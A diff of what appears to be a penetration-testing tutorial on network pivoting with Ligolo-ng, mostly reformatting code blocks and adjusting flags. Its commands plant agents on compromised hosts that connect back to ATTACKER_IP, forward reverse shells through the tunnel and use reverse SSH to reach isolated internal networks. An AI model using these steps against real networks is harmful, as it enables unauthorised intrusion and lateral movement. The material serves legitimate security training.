@@ -27,20 +27,19 @@ Before running Ligolo-ng, you must create a TUN Interface on the attacker PC so 
 
 `Creating a Tun Interface`
 
-```
+```bash
 # Before running ligolo-ng proxy, you must create a tuntap virtual interface
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
 ```
 
 <details>
-
 <summary>ligolo-setup-script</summary>
 
-```
+```bash
 #!/bin/bash
 me="$(whoami)"
-echo "addling ligolo routes to user: $user"
+echo "addling ligolo routes to user: $me"
 
 echo "creating the ligolo tun interface"
 sudo ip tuntap add user "$me" mode tun ligolo 
@@ -66,17 +65,17 @@ Once you have added the TUN Interface and the sub networks that you want to acce
 
 `Connecting to a Ligolo-Agent`
 
-```
+```bash
 # 1. On the attacking machine :
-./proxy -selfcert -laddr 0.0.0.0:9901
+./proxy -laddr <ip>:5555 -selfcert
 
 # 2. On each compromised host with the network that you want to pivot to
-./agent -connect ATTACKER_IP:9901
+./agent -connect <ATTACKER_IP>:5555 -ignore-cert
 ```
 
 ### Agent Binding/Listening
 
-`Agent Binding/listening on ligolo allows you to capture reverse shells from an internal network and forward it through the ligolo connection. You can then launch a netcat/pwncat-cs from the attacking machine seamlessly, give you the impression as if you were already in the target network.`
+> Agent Binding/listening on ligolo allows you to capture reverse shells from an internal network and forward it through the ligolo connection. You can then launch a netcat/pwncat-cs from the attacking machine seamlessly, give you the impression as if you were already in the target network.
 
 ## Ligolo-Ng Pivoting Tutorials / Use Cases
 
@@ -88,7 +87,7 @@ Once a connection is establised on the Public Facing Server that is in the Targe
 The following method works only when the Target Network has direct access to the attacking machine network, such as in a local network, via port forwarding or a VPN connection. More advanced pivoting techniques will be detailed below. If the attacking machine is in a NAT network, then, port forwarding should implemented.
 {% endhint %}
 
-```
+```bash
 # 1. Follow the ligolo setup process and start the ligolo proxy on the attacking machine 
 ./proxy -selfcert -laddr 0.0.0.0:9901
 
@@ -105,8 +104,8 @@ sudo ip route add 192.168.0.0/24 dev ligolo
 # 6. Once selected, type : 
 start
 
-//This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel
-//Allowing you to use any tool from the attacking maching against the new target machine
+# This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel
+# Allowing you to use any tool from the attacking maching against the new target machine
 ```
 
 ![image](https://user-images.githubusercontent.com/90450439/221353322-0abc5b8e-01dd-491a-b3f7-0a3b050393ac.png)
@@ -115,7 +114,7 @@ start
 
 Using the Ligolo's Agent Binding/Listening feature, it is possible to recieve a reverse shell connection from a target (in the Target Network) that does not have direct access to the attacking machine (ie. an internet/WAN access). An agent in a compromised server that can communicate with the target can also act as a listner, thus allowing to forward reverse shells through the ligolo tunnel back to the attacking machine.
 
-```
+```bash
 # 1. Establish an agent in the Public Facing server via ligolo agent
 
 # 2. On the ligolo proxy (on the attacking machine), select the agent
@@ -125,8 +124,8 @@ listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8899 --tcp
 
 # 4. Launch netcat/pwncat-cs on the attacker machine to recieve the reverse shell
 
-//Flags : --addr 0.0.0.0:1234 (the listener IP and port on the compromised server)
-//Flags : --to 127.0.0.1:8899 (the netcat/pwncat-cs listner on the attackers machine)
+# Flags : --addr 0.0.0.0:1234 (the listener IP and port on the compromised server)
+# Flags : --to 127.0.0.1:8899 (the netcat/pwncat-cs listner on the attackers machine)
 ```
 
 {% hint style="info" %}
@@ -139,22 +138,22 @@ In the following example, The reverse shell is initiated from the machine 192.16
 
 It is also possible to implant ligolo agents into deeper levels of the network in an organization inorder to compromise additional servers/devices. This follows the simmilar steps that were described for the Public Facing Server. However, this requires once again a reverse shell in the Internal Network or other sorts of foothold as a low privileged user in the internal network.
 
-```
+```bash
 # 2. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
 sudo ip route add 10.10.0.0/24 dev ligolo
 
 # 3. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs
 
 # 4. Initiate a connection from the ligolo agent to the ligolo proxy
-./agent -connect ATTACKER_IP:9901
+./agent -connect <ATTACKER_IP>:9901
 
 # 5. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)
 
 # 6. Once selected, type : 
 start
 
-//This will now route the sub network 10.10.0.0 via the ligolo TUN interface and through the ligolo tunnel
-//Allowing you to use any tool from the attacking maching against the new target machine
+# This will now route the sub network 10.10.0.0 via the ligolo TUN interface and through the ligolo tunnel
+# Allowing you to use any tool from the attacking maching against the new target machine
 ```
 
 ![image](https://user-images.githubusercontent.com/90450439/224545307-05571c12-31a9-41b7-b8cc-8b4365336e77.png)
@@ -165,8 +164,8 @@ In the case where the Target Network as well as the Internal Network has no poss
 
 To do this, you will first have to initiate a Reverse SSH Connection. This is mainly because the ligolo proxy always listens to connections that are first initiated by the ligolo agent. A reverse ssh connection will allow us to open a port within the Public Facing Server and whatever that connects to that perticular port will then be tunnled trough the SSH connection.
 
-```
-//Initiate a Reverse ssh connection to the target server
+```bash
+# Initiate a Reverse ssh connection to the target server
 
 ssh -R 7878:127.0.0.1:1337 user@target_server_ip
 ```
@@ -179,11 +178,11 @@ Once the ssh tunnel is established, now you can transfer the ligolo agent and ru
 The following method allows only a single ligolo agent connection. Due to the nature of the port mapping that is provided in the SSH reverse connection, once a ligolo agent "occupies" a port, it is not possible to use another ligolo agent on the same port.
 {% endhint %}
 
-```
-//On the attacking machine 
+```bash
+# On the attacking machine 
 ./proxy -selfcert -laddr 127.0.0.1:1337
 
-//On the target machine 
+# On the target machine 
 ./agent -connect 127.0.0.1:7878 -ignore-cert
 ```
 
